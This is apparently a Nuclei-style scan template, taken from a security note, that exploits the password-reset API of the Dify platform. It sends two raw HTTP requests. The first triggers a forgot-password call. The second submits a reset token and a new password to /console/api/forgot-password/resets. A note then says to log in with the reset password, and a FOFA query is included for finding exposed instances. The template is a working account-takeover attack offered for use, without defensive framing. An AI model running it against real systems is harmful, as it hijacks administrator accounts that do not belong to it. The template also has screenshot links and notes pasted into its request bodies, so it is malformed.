  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: vssxohfwsp4hbqo2
    fofa: app=”Dify”
http:
- raw:
  - 'POST /console/api/forgot-password HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    {"email":"test@qq.com","language":"zh-Hans"}

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827070093-00988997-10b0-4839-b899-c13a13da0f64.png)

    取第一步的data放入后续'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /console/api/forgot-password/resets HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    {"token": "68430164-eda9-4f78-8d9d-df7cbd76e13e","new_password":"123sadxQ@D214!!!","password_confirm":"123sadxQ@D214!!!"}

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827070238-43268493-930b-49b5-8dd6-8ddf478af6f9.png)

    使用重置后的密码登录

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827070418-27563d84-ad30-4eeb-b32d-36efb3fd6c4d.png)'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
